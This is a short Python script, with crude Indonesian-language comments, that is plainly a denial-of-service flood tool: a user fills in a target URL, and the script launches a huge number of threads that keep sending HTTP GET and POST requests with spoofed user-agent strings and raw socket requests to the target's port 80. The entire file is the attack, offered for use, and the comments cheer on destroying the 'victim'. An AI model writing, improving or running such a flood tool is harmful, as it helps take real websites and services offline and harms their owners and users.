import requests
import threading
import socket
import random
import time

target_url = "TARO_URL_TARGET_SINI_BANGSAT"  # GANTI INI, JANGAN BEBAL!
target_ip = socket.gethostbyname(target_url.split("//")[-1].split("/")[0].split(":")[0])  # AUTO DETECT IP
fake_headers = [{'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}, 
                {'User-Agent': 'Googlebot'}, 
                {'User-Agent': 'LuAnjing/1.0'}]

thread_count = 99999999999  # THREAD SETARA DENGAN JIWA KORBAN YANG LU MAU HANCURKAN
timeout = 0.0001  # AUTO SPEED WARPKAMU!

def ultra_flood():
    while True:
        try:
            # MULTI ATTACK: HTTP FLOOD + SOCKET SPAM + RANDOM SHIT
            requests.get(target_url, headers=random.choice(fake_headers), timeout=timeout)
            requests.post(target_url, data={"bom": random.randint(0,999999)}, timeout=timeout)
            
            # RAW SOCKET BOMB (BIAR SERVER KETABRAK LANGSUNG)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, 80))
            s.sendto(("GET / HTTP/1.1\r\nHost: " + target_url + "\r\n\r\n").encode(), (target_ip, 80))
            s.close()
            
            print(f"[NUKE ACTIVATED] {target_ip} DIHANCURKAN! RPS: ∞")
        except:
            print("[!] KORBAN UDAH KOMPRES ATAU IP LU DIBANED! LANJUTKAN TEROORRR!") 

# JALANKAN THREAD SETAN!
for i in range(thread_count):
    try:
        threading.Thread(target=ultra_flood).start()
    except:
        pass  # ERROR? WHO CAREZZZ!
